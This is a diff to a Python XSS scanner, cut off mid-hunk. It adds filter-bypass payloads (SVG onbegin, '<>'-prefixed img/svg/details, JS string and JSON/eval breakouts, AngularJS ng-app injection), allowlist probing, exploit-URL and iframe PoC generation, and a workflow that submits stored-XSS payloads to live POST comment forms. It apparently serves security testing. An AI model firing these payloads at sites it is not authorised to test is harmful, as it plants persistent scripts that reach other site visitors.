@@ -25,11 +25,32 @@ from .xss_scanner import FormParser, extract_forms, log, test_dom_xss, verify_al
 from .param_discovery import discover_parameters
 
 SEARCH_PRIORITY_PAYLOAD = '\"><svg onload=alert(1)>'
+SEARCH_SVG_ANIMATION_PRIORITY_PAYLOAD = '\"><svg><animatetransform onbegin=alert(1)>'
 SEARCH_ATTRIBUTE_PRIORITY_PAYLOAD = '"onmouseover="alert(1)'
 ATTR_EVENT_HANDLER_TECHNIQUE_ID = "xss_attr_event_handler_breakout"
 ATTR_EVENT_HANDLER_TECHNIQUE_NAME = "Quoted attribute breakout with injected event handler"
 STORED_HREF_JS_TECHNIQUE_ID = "stored_href_javascript_url"
 STORED_HREF_JS_TECHNIQUE_NAME = "Stored injection into anchor href (javascript: URL)"
+STORED_REPLACE_FIRST_ONLY_PAYLOAD = "<><img src=1 onerror=alert(1)>"
+STORED_REPLACE_FIRST_ONLY_TECHNIQUE_ID = "stored_xss_replace_first_occurrence_bypass"
+STORED_REPLACE_FIRST_ONLY_TECHNIQUE_NAME = "Bypass single-occurrence angle bracket encoding using leading <> pair"
+STORED_REPLACE_FIRST_ONLY_ALT_PAYLOADS = [
+    "<><svg/onload=alert(1)>",
+    "<><details open ontoggle=alert(1)>",
+]
+JS_STRING_BREAKOUT_PAYLOAD = "'-alert(1)-'"
+JS_STRING_BREAKOUT_TECHNIQUE_ID = "xss_js_string_breakout"
+JS_STRING_BREAKOUT_TECHNIQUE_NAME = "Break out of JavaScript string and execute alert"
+JSON_EVAL_BACKSLASH_BREAKOUT_PAYLOAD = '\\"-alert(1)}//'
+JSON_EVAL_BACKSLASH_BREAKOUT_TECHNIQUE_ID = "xss_json_eval_backslash_breakout"
+JSON_EVAL_BACKSLASH_BREAKOUT_TECHNIQUE_NAME = "JSON response backslash escape bypass leading to eval() execution"
+ANGULARJS_EXPR_PAYLOAD = "{{$on.constructor('alert(1)')()}}"
+ANGULARJS_TECHNIQUE_ID = "angularjs_expression_injection_ng_app"
+ANGULARJS_TECHNIQUE_NAME = "AngularJS expression injection via reflected value in ng-app directive"
+TAG_EVENT_ALLOWLIST_TECHNIQUE_ID = "xss_tag_event_allowlist_bypass"
+TAG_EVENT_ALLOWLIST_TECHNIQUE_NAME = "Bypass tag/event allowlist by probing accepted HTML tag and event handler"
+SVG_ANIMATION_ALLOWLIST_TECHNIQUE_ID = "xss_svg_animation_onbegin_allowlist_bypass"
+SVG_ANIMATION_ALLOWLIST_TECHNIQUE_NAME = "Bypass tag allowlist using SVG animation element with onbegin event"
 PAYLOAD_DEBUG_LOG_LIMIT = 5  # Per-parameter, to avoid log spam
 MAX_BROWSER_VERIFICATIONS_PER_TARGET = 3
 
@@ -65,10 +86,65 @@ def _is_website_field(name: str) -> bool:
     return nl in ('website', 'url', 'homepage', 'home', 'link', 'site')
 
 
+def _candidate_stored_text_fields(form: Dict) -> List[str]:
+    """
+    Fallback selector for stored-XSS testing on POST forms when explicit
+    comment-like names are absent.
+    """
+    ranked: List[str] = []
+    seen: Set[str] = set()
+    inputs = form.get('inputs', []) or []
+    if not inputs:
+        return ranked
+
+    high_signal = ('comment', 'message', 'content', 'body', 'text', 'review', 'feedback', 'description', 'details', 'post')
+    exclude_name_tokens = (
+        'email', 'mail', 'website', 'url', 'homepage', 'phone', 'tel',
+        'csrf', 'token', 'nonce', 'id', 'postid', 'article', 'blog', 'name'
+    )
+    exclude_types = {'hidden', 'submit', 'button', 'image', 'checkbox', 'radio', 'file', 'password', 'url', 'email', 'tel', 'number'}
+
+    textlike: List[str] = []
+    for inp in inputs:
+        name = (inp.get('name') or '').strip()
+        if not name or name in seen:
+            continue
+        seen.add(name)
+        itype = (inp.get('type') or 'text').lower()
+        nl = name.lower()
+        if itype in exclude_types:
+            continue
+        if any(tok in nl for tok in exclude_name_tokens):
+            continue
+        textlike.append(name)
+        if any(tok in nl for tok in high_signal):
+            ranked.append(name)
+
+    # Preserve order, append lower-signal text-like fields afterwards.
+    for n in textlike:
+        if n not in ranked:
+            ranked.append(n)
+    return ranked[:3]
+
+
 def _build_form_payload(form: Dict, field_name: str, payload: str) -> Dict:
     """
     Build a form submission payload with sensible defaults.
     """
+    def _default_value_for_input(name: str, itype: str) -> str:
+        nl = (name or '').lower()
+        if itype == 'email' or 'email' in nl:
+            return 'example@gmail.com'
+        if itype == 'url' or any(tok in nl for tok in ('website', 'url', 'homepage', 'site', 'link')):
+            return 'https://example.com'
+        if itype == 'number' or any(tok in nl for tok in ('id', 'postid', 'articleid', 'blogid')):
+            return '1'
+        if itype == 'tel' or any(tok in nl for tok in ('phone', 'tel', 'mobile')):
+            return '5550100'
+        if 'name' in nl:
+            return 'scanner-user'
+        return 'test'
+
     data = {}
     for inp in form.get('inputs', []):
         name = inp.get('name')
@@ -82,20 +158,12 @@ def _build_form_payload(form: Dict, field_name: str, payload: str) -> Dict:
         if value:
             data[name] = value
             continue
-        if itype == 'email' or 'email' in name.lower():
-            data[name] = 'test@example.com'
-        elif itype == 'url' or name.lower() in ('website', 'url', 'homepage'):
-            data[name] = 'https://example.com'
-        elif itype == 'number':
-            data[name] = '1'
-        elif itype == 'tel' or 'phone' in name.lower():
-            data[name] = '5550100'
-        elif itype == 'checkbox':
+        if itype == 'checkbox':
             data[name] = 'on'
         elif itype == 'hidden' and value:
             data[name] = value
         else:
-            data[name] = 'test'
+            data[name] = _default_value_for_input(name, itype)
     return data
 
 
@@ -104,6 +172,243 @@ def _payload_in_anchor_href(html: str, payload: str) -> bool:
         return False
     pat = r'<a[^>]+href\s*=\s*["\'][^"\']*' + re.escape(payload) + r'[^"\']*["\']'
     return re.search(pat, html, re.IGNORECASE | re.DOTALL) is not None
+
+
+def _build_stored_comment_payloads(max_payloads: int) -> List[str]:
+    """
+    Build a bounded, deduplicated payload list for stored comment-like inputs.
+    Prioritize generic filter-bypass candidates before broad basic payloads.
+    """
+    ordered: List[str] = [STORED_REPLACE_FIRST_ONLY_PAYLOAD]
+    ordered.extend(STORED_REPLACE_FIRST_ONLY_ALT_PAYLOADS)
+    ordered.extend(XSSPayloads.get_basic_payloads())
+    seen: Set[str] = set()
+    out: List[str] = []
+    for p in ordered:
+        if p in seen:
+            continue
+        seen.add(p)
+        out.append(p)
+        if len(out) >= max_payloads:
+            break
+    return out
+
+
+def _looks_like_comment_submission_success(html_text: str) -> bool:
+    if not html_text:
+        return False
+    return re.search(r'\b(thank you|comment (?:submitted|awaiting|posted)|submission received)\b', html_text, re.IGNORECASE) is not None
+
+
+def _should_try_tag_event_allowlist(param_name: str) -> bool:
+    if not param_name:
+        return False
+    p = param_name.lower()
+    return any(tok in p for tok in ("search", "q", "query", "keyword", "term"))
+
+
+def _probe_tag_event_allowlist_xss(
+    client: httpx.Client,
+    base_url: str,
+    param_name: str,
+    baseline_params: Dict[str, List[str]],
+    headers: Optional[Dict[str, str]] = None,
+    browser_verify: bool = False,
+) -> Optional[Dict]:
+    """
+    Probe for reflected XSS where most tags/events are blocked but one tag/event
+    combination is allowed (for example, body+onresize).
+    """
+    if not _should_try_tag_event_allowlist(param_name):
+        return None
+
+    svg_nested_tags = {"animatetransform", "animate", "set", "image", "title"}
+
+    def _tag_probe_payload(tag: str) -> str:
+        if tag in svg_nested_tags:
+            return f"<svg><{tag}>"
+        return f"<{tag}>"
+
+    def _event_probe_payload(tag: str, event: str) -> str:
+        if tag in svg_nested_tags:
+            return f"<svg><{tag} {event}=1>"
+        return f"<{tag} {event}=1>"
+
+    def _exploit_payload(tag: str, event: str) -> str:
+        if tag in svg_nested_tags:
+            return f'\"><svg><{tag} {event}=print()>'
+        return f'\"><{tag} {event}=print()>'
+
+    def _display_markup(tag: str, event: str) -> str:
+        if tag in svg_nested_tags:
+            return f"<svg><{tag} {event}=print()>"
+        return f"<{tag} {event}=print()>"
+
+    def _req(payload: str):
+        test_params = {k: (list(v) if isinstance(v, list) else [str(v)]) for k, v in baseline_params.items()}
+        test_params[param_name] = [payload]
+        flat = {k: v[0] if isinstance(v, list) else v for k, v in test_params.items()}
+        resp = client.get(base_url, params=flat)
+        return resp, flat
+
+    try:
+        baseline_payload = "<img src=1 onerror=print()>"
+        baseline_resp, _ = _req(baseline_payload)
+        if baseline_resp.status_code < 400:
+            return None
+
+        tag_candidates = ["body", "math", "animatetransform", "animate", "svg", "image", "title", "details", "marquee", "iframe", "a"]
+        allowed_tags: List[str] = []
+        for tag in tag_candidates:
+            resp, _ = _req(_tag_probe_payload(tag))
+            if resp.status_code < 400:
+                allowed_tags.append(tag)
+        if not allowed_tags:
+            return None
+
+        event_candidates = ["onbegin", "onresize", "onload", "onanimationstart", "onfocus", "onclick", "onmouseover", "onerror"]
+        allowed_tag = None
+        allowed_event = None
+        for tag in allowed_tags:
+            for ev in event_candidates:
+                if tag == "svg" and ev == "onbegin":
+                    # Prefer executable SVG animation elements for onbegin probes.
+                    continue
+                resp, _ = _req(_event_probe_payload(tag, ev))
+                if resp.status_code < 400:
+                    allowed_tag = tag
+                    allowed_event = ev
+                    break
+            if allowed_event:
+                break
+        if not allowed_tag or not allowed_event:
+            return None
+
+        exploit_payload = _exploit_payload(allowed_tag, allowed_event)
+        final_resp, final_params = _req(exploit_payload)
+        body = final_resp.text or ""
+        if final_resp.status_code >= 400 or f"{allowed_event}=print()" not in body:
+            return None
+
+        exploit_url = _build_minimal_get_exploit_url(str(final_resp.url), base_url, param_name, exploit_payload)
+        verified = False
+        if browser_verify:
+            try:
+                verified = verify_alert_with_playwright(exploit_url, headers=headers)
+            except Exception:
+                verified = False
+
+        curl_cmd = ExploitationProofGenerator.generate_curl_command('GET', base_url, final_params, headers=headers)
+        reflected_markup = _display_markup(allowed_tag, allowed_event)
+        browser_steps = [
+            f"Open: {exploit_url}",
+            f"Observe reflected injection using {reflected_markup}",
+        ]
+        poc_html = (
+            f"<iframe src=\"{html_escape.escape(exploit_url)}\" "
+            f"onload=\"this.style.width='100px';this.style.height='100px'\"></iframe>"
+        )
+        if allowed_tag == "body" and allowed_event == "onresize":
+            browser_steps.append("Use the provided iframe PoC to auto-trigger onresize without user interaction")
+        if allowed_tag in svg_nested_tags and allowed_event == "onbegin":
+            browser_steps.append("SVG animation events auto-fire; observe print() without user interaction")
+
+        is_svg_animation = allowed_tag in svg_nested_tags and allowed_event == "onbegin"
+        technique_id = SVG_ANIMATION_ALLOWLIST_TECHNIQUE_ID if is_svg_animation else TAG_EVENT_ALLOWLIST_TECHNIQUE_ID
+        technique_name = SVG_ANIMATION_ALLOWLIST_TECHNIQUE_NAME if is_svg_animation else TAG_EVENT_ALLOWLIST_TECHNIQUE_NAME
+        description_markup = f"<svg><{allowed_tag}>" if allowed_tag in svg_nested_tags else f"<{allowed_tag}>"
+
+        return {
+            "type": "reflected_xss",
+            "method": "GET",
+            "parameter": param_name,
+            "payload": exploit_payload,
+            "url": exploit_url,
+            "context": "tag-event-allowlist-bypass",
+            "severity": "high" if (not browser_verify or verified) else "medium",
+            "technique_id": technique_id,
+            "technique_name": technique_name,
+            "description": f"Reflected XSS via allowlisted {description_markup} tag path and {allowed_event} event in GET parameter \"{param_name}\"",
+            "discovery_method": "Tag/event allowlist probing",
+            "verified": bool(verified) if browser_verify else False,
+            "exploitation": {
+                "curl_command": curl_cmd,
+                "browser_steps": browser_steps,
+                "poc_html": poc_html,
+            },
+            "evidence": {
+                "blocked_baseline_payload": baseline_payload,
+                "allowed_tag": allowed_tag,
+                "allowed_event": allowed_event,
+                "allowed_tags": allowed_tags,
+            },
+        }
+    except Exception:
+        return None
+
+
+def _matches_replace_first_occurrence_bypass(html_text: str) -> bool:
+    """
+    Detect the generic pattern where the leading angle bracket pair is partially/fully
+    encoded while a subsequent attacker-controlled <img ... onerror=alert(1)> remains active.
+    """
+    if not html_text:
+        return False
+    text = html_text
+    encoded_lead = re.search(r'&lt;\s*(?:&gt;|>|&#62;|&#x3e;)', text, re.IGNORECASE)
+    if not encoded_lead:
+        return False
+    img_exec = re.search(
+        r'<img\b[^>]*\bonerror\s*=\s*["\']?\s*alert\s*\(\s*1\s*\)\s*["\']?[^>]*>',
+        text,
+        re.IGNORECASE | re.DOTALL,
+    )
+    svg_exec = re.search(
+        r'<svg\b[^>]*\bonload\s*=\s*["\']?\s*alert\s*\(\s*1\s*\)\s*["\']?[^>]*>',
+        text,
+        re.IGNORECASE | re.DOTALL,
+    )
+    det_exec = re.search(
+        r'<details\b[^>]*\bontoggle\s*=\s*["\']?\s*alert\s*\(\s*1\s*\)\s*["\']?[^>]*>',
+        text,
+        re.IGNORECASE | re.DOTALL,
+    )
+    exec_matches = [m for m in (img_exec, svg_exec, det_exec) if m]
+    if not exec_matches:
+        return False
+    first_exec = min(exec_matches, key=lambda m: m.start())
+    return encoded_lead.start() < first_exec.start()
+
+
+def _looks_like_angularjs(html_text: str) -> bool:
+    if not html_text:
+        return False
+    ht = html_text.lower()
+    return ("ng-app" in ht) or ("angular.js" in ht) or ("angular.min.js" in ht) or ("ng-controller" in ht)
+
+
+def _reflected_in_ng_app(html_text: str, value: str) -> bool:
+    """
+    Detect reflection into an ng-app directive value (quoted or unquoted).
+    This is a strong signal for AngularJS expression injection.
+    """
+    if not html_text or not value:
+        return False
+    # Quoted: ng-app="...VALUE..."
+    quoted = re.search(
+        r'\bng-app\s*=\s*["\'][^"\']*' + re.escape(value) + r'[^"\']*["\']',
+        html_text,
+        re.IGNORECASE | re.DOTALL,
+    )
+    if quoted:
+        return True
+    # Unquoted: ng-app=VALUE (rare but possible)
+    unquoted = re.search(
+        r'\bng-app\s*=\s*[^>\s"\']*' + re.escape(value) + r'[^>\s"\']*',
+        html_text,
+        re.IGNORECASE | re.DOTALL,
+    )
+    return bool(unquoted)
 
 
 def _crawl_in_scope_pages(start_url: str, max_pages: int, max_depth: int, timeout: int, headers: Optional[Dict[str, str]] = None) -> List[Tuple[str, str]]:
@@ -150,6 +455,97 @@ def _crawl_in_scope_pages(start_url: str, max_pages: int, max_depth: int, timeou
                 continue
 
     return results
+
+
+def _discover_dom_xss_candidate_pages(base_url: str, timeout: int, headers: Optional[Dict[str, str]] = None, max_urls: int = 8) -> List[str]:
+    """
+    DOM XSS sinks like `document.write(URLSearchParams(location.search).get(...))` are often on
+    parameterized endpoints. Starting scans from the base URL can miss them,
+    so we opportunistically collect a small set of same-origin, parameterized links.
+    """
+    out: List[str] = []
+    seen: Set[str] = set()
+
+    try:
+        start = urllib.parse.urlparse(base_url)
+        base_origin = (start.scheme, start.netloc)
+    except Exception:
+        return out
+
+    def _add(u: str) -> None:
+        if not u or u in seen:
+            return
+        seen.add(u)
+        out.append(u)
+
+    try:
+        with httpx.Client(timeout=timeout, follow_redirects=True, verify=False, headers=headers) as client:
+            r = client.get(base_url)
+            html = r.text or ""
+            for link in re.findall(r'(?:href|src|action)\s*=\s*["\']([^"\']+)["\']', html, re.IGNORECASE):
+                full = urllib.parse.urljoin(base_url, link)
+                try:
+                    p = urllib.parse.urlparse(full)
+                except Exception:
+                    continue
+                if p.scheme not in ("http", "https"):
+                    continue
+                if (p.scheme, p.netloc) != base_origin:
+                    continue
+
+                qs = urllib.parse.parse_qs(p.query or "")
+                if not qs:
+                    continue
+
+                _add(full)
+
+                if len(out) >= max_urls:
+                    break
+    except Exception:
+        return out[:max_urls]
+
+    return out[:max_urls]
+
+
+def _build_in_scope_verify_urls(start_url: str, pages: List[Tuple[str, str]], max_urls: int = 30) -> List[str]:
+    """
+    Build a bounded list of same-origin pages to revisit after POST submissions.
+    This improves stored-XSS verification by checking where content may be rendered.
+    """
+    out: List[str] = []
+    seen: Set[str] = set()
+    try:
+        base = urllib.parse.urlparse(start_url)
+        base_origin = (base.scheme, base.netloc)
+    except Exception:
+        return out
+
+    def _add(candidate: str) -> None:
+        if not candidate:
+            return
+        try:
+            p = urllib.parse.urlparse(candidate)
+        except Exception:
+            return
+        if p.scheme not in ("http", "https"):
+            return
+        if (p.scheme, p.netloc) != base_origin:
+            return
+        normalized = urllib.parse.urlunparse((p.scheme, p.netloc, p.path or "/", "", p.query, ""))
+        if normalized in seen:
+            return
+        seen.add(normalized)
+        out.append(normalized)
+
+    for page_url, page_html in pages:
+        _add(page_url)
+        for link in re.findall(r'(?:href|action)\s*=\s*["\']([^"\']+)["\']', page_html or "", re.IGNORECASE):
+            _add(urllib.parse.urljoin(page_url, link))
+            if len(out) >= max_urls:
+                return out
+        if len(out) >= max_urls:
+            return out
+    return out
 
 
 def _log_parameter_summary(params: Dict) -> None:
@@ -731,6 +1127,8 @@ def advanced_xss_scan(url: str,
             
             # Extract forms
             forms = extract_forms(initial_response.text)
+            stored_verify_urls: List[str] = []
+            stored_pages: List[Tuple[str, str]] = [(url, initial_response.text or "")]
             for f in forms:
                 try:
                     f.setdefault('_source_url', url)
@@ -739,23 +1137,36 @@ def advanced_xss_scan(url: str,
             _log_form_summary(forms)
 
             # For stored-XSS workflows, we often need to find forms that live on content pages
-            # (for example individual blog posts). Do a small same-origin crawl to collect forms.
+            # (for example individual blog posts). Do a same-origin crawl to collect pages/forms.
             if enable_stored_workflow:
                 try:
                     has_post_form = any((frm.get('method') or '').upper() == 'POST' for frm in forms)
                 except Exception:
                     has_post_form = False
-                if not has_post_form:
-                    try:
-                        pages = _crawl_in_scope_pages(url, max_pages=20, max_depth=2, timeout=timeout, headers=headers)
+                try:
+                    crawl_max_pages = 20 if not has_post_form else 10
+                    crawl_max_depth = 2 if not has_post_form else 1
+                    pages = _crawl_in_scope_pages(
+                        url,
+                        max_pages=crawl_max_pages,
+                        max_depth=crawl_max_depth,
+                        timeout=timeout,
+                        headers=headers,
+                    )
+                    stored_pages.extend(pages)
+                    if not has_post_form:
                         for page_url, page_html in pages:
                             for frm in extract_forms(page_html):
                                 frm['_source_url'] = page_url
                                 forms.append(frm)
                         # Re-log summary if we added forms
                         _log_form_summary(forms)
-                    except Exception:
-                        pass
+                except Exception:
+                    pass
+                try:
+                    stored_verify_urls = _build_in_scope_verify_urls(url, stored_pages, max_urls=30)
+                except Exception:
+                    stored_verify_urls = [url]
             
             # Parse URL parameters
             parsed = urllib.parse.urlparse(url)
@@ -858,6 +1269,67 @@ def advanced_xss_scan(url: str,
             browser_verifications = 0
             for param_name, context in context_map.items():
                 log(f"Testing XSS on GET parameter: {param_name} (context: {context})", 'INFO')
+
+                # Tag/event allowlist bypass technique for filtered reflected inputs.
+                try:
+                    allowlist_vuln = _probe_tag_event_allowlist_xss(
+                        client=client,
+                        base_url=base_url,
+                        param_name=param_name,
+                        baseline_params=baseline_params,
+                        headers=headers,
+                        browser_verify=browser_verify,
+                    )
+                    if allowlist_vuln:
+                        vulnerabilities.append(allowlist_vuln)
+                        log(f"XSS FOUND: tag/event allowlist bypass via {param_name}", "VULN")
+                        continue
+                except Exception:
+                    pass
+
+                # AngularJS expression injection technique (ng-app directive)
+                # Only attempt once per parameter to avoid slowing down the scan.
+                try:
+                    test_params = _copy_baseline_params()
+                    test_params[param_name] = [ANGULARJS_EXPR_PAYLOAD]
+                    flat_params = {k: v[0] if isinstance(v, list) else v for k, v in test_params.items()}
+                    ang_resp = client.get(base_url, params=flat_params)
+                    ang_reflected = ANGULARJS_EXPR_PAYLOAD in (ang_resp.text or "")
+                    if ang_reflected and _looks_like_angularjs(ang_resp.text or "") and _reflected_in_ng_app(ang_resp.text or "", ANGULARJS_EXPR_PAYLOAD):
+                        verified = False
+                        if browser_verify and browser_verifications < MAX_BROWSER_VERIFICATIONS_PER_TARGET:
+                            verify_url = str(ang_resp.url)
+                            log(f"Browser-verifying AngularJS expression injection: {verify_url}", "INFO")
+                            verified = verify_alert_with_playwright(verify_url, headers=headers)
+                            browser_verifications += 1
+                            log(f"Browser verification result: {verified}", "INFO")
+
+                        curl_cmd = ExploitationProofGenerator.generate_curl_command('GET', base_url, flat_params, headers=headers)
+                        browser_steps = ExploitationProofGenerator.generate_browser_steps('GET', str(ang_resp.url), param_name, ANGULARJS_EXPR_PAYLOAD)
+                        vulnerabilities.append(
+                            {
+                                "type": "reflected_xss",
+                                "method": "GET",
+                                "parameter": param_name,
+                                "payload": ANGULARJS_EXPR_PAYLOAD,
+                                "url": str(ang_resp.url),
+                                "context": "angularjs-ng-app",
+                                "severity": "high" if (not browser_verify or verified) else "medium",
+                                "technique_id": ANGULARJS_TECHNIQUE_ID,
+                                "technique_name": ANGULARJS_TECHNIQUE_NAME,
+                                "description": f"AngularJS expression injection reflected into ng-app via GET parameter \"{param_name}\"" + (" (verified)" if verified else ""),
+                                "discovery_method": "AngularJS ng-app directive reflection",
+                                "verified": bool(verified) if browser_verify else False,
+                                "exploitation": {
+                                    "curl_command": curl_cmd,
+                                    "browser_steps": browser_steps,
+                                },
+                            }
+                        )
+                        log(f"XSS FOUND: AngularJS expression injection via {param_name}", "VULN")
+                        # Continue scanning for other issues; don't early-break the entire param loop.
+                except Exception:
+                    pass
                 
                 # Get context-specific payloads
                 if safe_mode:
@@ -948,10 +1420,16 @@ def advanced_xss_scan(url: str,
                                     'poc_html': poc_html,
                                 },
                             }
-                            # Tag specific lab-derived technique when we inject an attribute event handler breakout.
+                            # Tag known technique when we inject an attribute event handler breakout.
                             if isinstance(payload, str) and 'onmouseover' in payload.lower():
                                 vuln['technique_id'] = ATTR_EVENT_HANDLER_TECHNIQUE_ID
                                 vuln['technique_name'] = ATTR_EVENT_HANDLER_TECHNIQUE_NAME
+                            if payload == JS_STRING_BREAKOUT_PAYLOAD:
+                                vuln['technique_id'] = JS_STRING_BREAKOUT_TECHNIQUE_ID
+                                vuln['technique_name'] = JS_STRING_BREAKOUT_TECHNIQUE_NAME
+                            if payload == JSON_EVAL_BACKSLASH_BREAKOUT_PAYLOAD:
+                                vuln['technique_id'] = JSON_EVAL_BACKSLASH_BREAKOUT_TECHNIQUE_ID
+                                vuln['technique_name'] = JSON_EVAL_BACKSLASH_BREAKOUT_TECHNIQUE_NAME
                             
                             vulnerabilities.append(vuln)
                             log(f"XSS FOUND: {param_name} (severity: {severity}, score: {score}, discovered via: {discovery_method})", 'VULN')
@@ -1021,6 +1499,12 @@ def advanced_xss_scan(url: str,
                                             if isinstance(variant, str) and 'onmouseover' in variant.lower():
                                                 vuln_data['technique_id'] = ATTR_EVENT_HANDLER_TECHNIQUE_ID
                                                 vuln_data['technique_name'] = ATTR_EVENT_HANDLER_TECHNIQUE_NAME
+                                            if variant == JS_STRING_BREAKOUT_PAYLOAD:
+                                                vuln_data['technique_id'] = JS_STRING_BREAKOUT_TECHNIQUE_ID
+                                                vuln_data['technique_name'] = JS_STRING_BREAKOUT_TECHNIQUE_NAME
+                                            if variant == JSON_EVAL_BACKSLASH_BREAKOUT_PAYLOAD:
+                                                vuln_data['technique_id'] = JSON_EVAL_BACKSLASH_BREAKOUT_TECHNIQUE_ID
+                                                vuln_data['technique_name'] = JSON_EVAL_BACKSLASH_BREAKOUT_TECHNIQUE_NAME
                                             vulnerabilities.append(vuln_data)
                                             log(f"XSS FOUND (adaptive): {param_name} (context: {observed_context})", 'VULN')
                                             break
@@ -1093,6 +1577,47 @@ def advanced_xss_scan(url: str,
                             continue
                         
                         field_name = input_field['name']
+
+                        # AngularJS expression injection via reflected ng-app directive
+                        try:
+                            if (form.get('method') or 'GET').upper() == 'GET':
+                                form_data = {}
+                                for inp in form['inputs']:
+                                    n = inp.get('name')
+                                    if not n:
+                                        continue
+                                    form_data[n] = ANGULARJS_EXPR_PAYLOAD if n == field_name else (inp.get('value') or 'test')
+                                ang_resp = client.get(form_url, params=form_data)
+                                ang_reflected = ANGULARJS_EXPR_PAYLOAD in (ang_resp.text or "")
+                                if ang_reflected and _looks_like_angularjs(ang_resp.text or "") and _reflected_in_ng_app(ang_resp.text or "", ANGULARJS_EXPR_PAYLOAD):
+                                    verified = False
+                                    if browser_verify and browser_verifications < MAX_BROWSER_VERIFICATIONS_PER_TARGET:
+                                        verify_url = str(ang_resp.url)
+                                        log(f"Browser-verifying AngularJS expression injection: {verify_url}", "INFO")
+                                        verified = verify_alert_with_playwright(verify_url, headers=headers)
+                                        browser_verifications += 1
+                                        log(f"Browser verification result: {verified}", "INFO")
+
+                                    vulnerabilities.append(
+                                        {
+                                            "type": "reflected_xss",
+                                            "method": "GET",
+                                            "parameter": field_name,
+                                            "payload": ANGULARJS_EXPR_PAYLOAD,
+                                            "url": str(ang_resp.url),
+                                            "context": "angularjs-ng-app",
+                                            "severity": "high" if (not browser_verify or verified) else "medium",
+                                            "technique_id": ANGULARJS_TECHNIQUE_ID,
+                                            "technique_name": ANGULARJS_TECHNIQUE_NAME,
+                                            "description": f"AngularJS expression injection reflected into ng-app via GET form input \"{field_name}\"" + (" (verified)" if verified else ""),
+                                            "discovery_method": "Form extraction (AngularJS ng-app)",
+                                            "verified": bool(verified) if browser_verify else False,
+                                        }
+                                    )
+                                    log(f"XSS FOUND: AngularJS expression injection in form input {field_name}", "VULN")
+                                    break
+                        except Exception:
+                            pass
                         
                         # Test with basic payloads for forms
                         adaptive_used_form = False
@@ -1177,9 +1702,57 @@ def advanced_xss_scan(url: str,
                     # Stored XSS workflow (POST forms with comment-like fields)
                     if enable_stored_workflow and form.get('method', 'GET').upper() == 'POST':
                         comment_fields = [inp.get('name') for inp in form.get('inputs', []) if _is_comment_field(inp.get('name', ''))]
+                        if not comment_fields:
+                            comment_fields = _candidate_stored_text_fields(form)
+                            if comment_fields:
+                                log(f"Stored-XSS fallback fields selected: {', '.join(comment_fields)}", 'DEBUG')
                         if comment_fields:
                             for field_name in comment_fields:
-                                for payload in XSSPayloads.get_basic_payloads()[:max_payloads_per_param]:
+                                def _stored_verify_candidates_from_response(post_response) -> List[str]:
+                                    verify_candidates = []
+                                    verify_candidates.extend(stored_verify_urls)
+                                    location = post_response.headers.get('location')
+                                    if location:
+                                        verify_candidates.append(urllib.parse.urljoin(form_url, location))
+                                    source_url = form.get('_source_url') or None
+                                    if source_url:
+                                        verify_candidates.append(source_url)
+                                    verify_candidates.append(form_url)
+                                    verify_candidates.append(url)
+                                    return verify_candidates
+
+                                marker = _random_token(12)
+                                marker_form_data = _build_form_payload(form, field_name, marker)
+                                marker_render_urls: List[str] = []
+                                try:
+                                    marker_resp = client.post(form_url, data=marker_form_data)
+                                    if marker_resp.status_code < 400:
+                                        seen_marker_urls = set()
+                                        for verify_url in _stored_verify_candidates_from_response(marker_resp):
+                                            if verify_url in seen_marker_urls:
+                                                continue
+                                            seen_marker_urls.add(verify_url)
+                                            try:
+                                                verify_resp = client.get(verify_url)
+                                            except Exception:
+                                                continue
+                                            if marker in (verify_resp.text or ""):
+                                                marker_render_urls.append(verify_url)
+                                        if marker_render_urls:
+                                            log(
+                                                f"Stored marker rendered for field '{field_name}' at: {', '.join(marker_render_urls[:3])}",
+                                                'DEBUG',
+                                            )
+                                        elif _looks_like_comment_submission_success(marker_resp.text or ""):
+                                            log(
+                                                f"Stored marker accepted for field '{field_name}' but not immediately rendered (possible moderation/delay).",
+                                                'DEBUG',
+                                            )
+                                except Exception:
+                                    pass
+
+                                stored_candidates = _build_stored_comment_payloads(max_payloads_per_param)
+                                for payload in stored_candidates:
                                     try:
                                         attempted_payloads += 1
                                         form_data = _build_form_payload(form, field_name, payload)
@@ -1188,28 +1761,41 @@ def advanced_xss_scan(url: str,
                                             continue
 
                                         verify_candidates = []
-                                        location = post_resp.headers.get('location')
-                                        if location:
-                                            verify_candidates.append(urllib.parse.urljoin(form_url, location))
-                                        verify_candidates.append(form_url)
-                                        verify_candidates.append(url)
+                                        verify_candidates.extend(marker_render_urls)
+                                        verify_candidates.extend(_stored_verify_candidates_from_response(post_resp))
                                         seen = set()
                                         for verify_url in verify_candidates:
                                             if verify_url in seen:
                                                 continue
                                             seen.add(verify_url)
                                             verify_resp = client.get(verify_url)
-                                            if payload in verify_resp.text and is_xss_vulnerable(verify_resp.text, payload):
+                                            direct_stored_xss = payload in verify_resp.text and is_xss_vulnerable(verify_resp.text, payload)
+                                            replace_bypass_stored_xss = False
+                                            if payload == STORED_REPLACE_FIRST_ONLY_PAYLOAD or payload in STORED_REPLACE_FIRST_ONLY_ALT_PAYLOADS:
+                                                body = verify_resp.text or ""
+                                                replace_bypass_stored_xss = _matches_replace_first_occurrence_bypass(body)
+                                            if direct_stored_xss or replace_bypass_stored_xss:
+                                                verified = False
+                                                if browser_verify:
+                                                    try:
+                                                        verified = verify_alert_with_playwright(verify_url, headers=headers)
+                                                    except Exception:
+                                                        verified = False
                                                 vuln_data = {
                                                     'type': 'stored_xss',
                                                     'method': 'POST',
                                                     'parameter': field_name,
                                                     'payload': payload,
                                                     'url': verify_url,
-                                                    'severity': 'critical',
+                                                    'severity': 'critical' if (not browser_verify or verified) else 'high',
                                                     'description': f'Stored XSS via POST form input "{field_name}"',
                                                     'discovery_method': 'Stored form workflow',
+                                                    'verified': bool(verified) if browser_verify else False,
                                                 }
+                                                if payload == STORED_REPLACE_FIRST_ONLY_PAYLOAD or payload in STORED_REPLACE_FIRST_ONLY_ALT_PAYLOADS:
+                                                    vuln_data['technique_id'] = STORED_REPLACE_FIRST_ONLY_TECHNIQUE_ID
+                                                    vuln_data['technique_name'] = STORED_REPLACE_FIRST_ONLY_TECHNIQUE_NAME
+                                                    vuln_data['description'] = f'Stored XSS via single-occurrence angle bracket encoding bypass in "{field_name}"' + (" (verified)" if (browser_verify and verified) else "")
                                                 vulnerabilities.append(vuln_data)
                                                 log(f"STORED XSS FOUND: Form input {field_name}", 'VULN')
                                                 break
@@ -1296,9 +1882,19 @@ def advanced_xss_scan(url: str,
     
     # Append DOM XSS findings from static analysis and PoC generation
     try:
-        dom_vulns = test_dom_xss(url, timeout=timeout, browser_verify=browser_verify)
-        if dom_vulns:
-            vulnerabilities.extend(dom_vulns)
+        dom_targets = [url]
